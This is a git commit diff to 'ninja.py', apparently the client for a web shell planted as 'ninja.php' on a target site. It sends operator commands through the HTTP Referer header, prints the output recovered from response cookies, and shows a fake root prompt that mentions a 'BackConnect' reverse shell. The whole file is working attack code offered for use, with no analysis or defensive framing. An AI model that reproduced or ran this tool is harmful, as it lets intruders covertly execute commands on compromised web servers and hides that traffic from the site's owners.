4283bd1cad31859be379c88edef3b06df32764c1
Bloos3rpent <67107159+bloos3rpent@users.noreply.github.com>
2021-02-03 02:36:17 +0800

    optimizations

--- ninja.py
+++ ninja.py
@@ -1,5 +1,6 @@
 import requests
 from urllib.parse import unquote
+from urllib.parse import urlparse
 
 print('''                                 
                     ,--,,-.----.    
@@ -21,12 +22,20 @@ print('''
 ''')
 
 def main():
-    cmd = input("> ")
-    r=requests.get(target, headers={"Referer":cmd})
-    for c in r.cookies:
-        print(unquote(c.value))
-    main()
+    print("")
+    cmd = input("bloostealth@"+domain+" ~#: ")
+    if cmd == "su":
+        print("")
+        print("Bloos3rpent > You Need to BackConnect First!")
+        main()
+    else :
+        r=requests.get(target, headers={"Referer":cmd})
+        for c in r.cookies:
+            print(unquote(c.value))
+        main()
 
 
 target = input("Target site (http://xxxxx.com/ninja.php) > ")
+parsed_uri = urlparse(target)
+domain = '{uri.netloc}'.format(uri=parsed_uri)
 main()
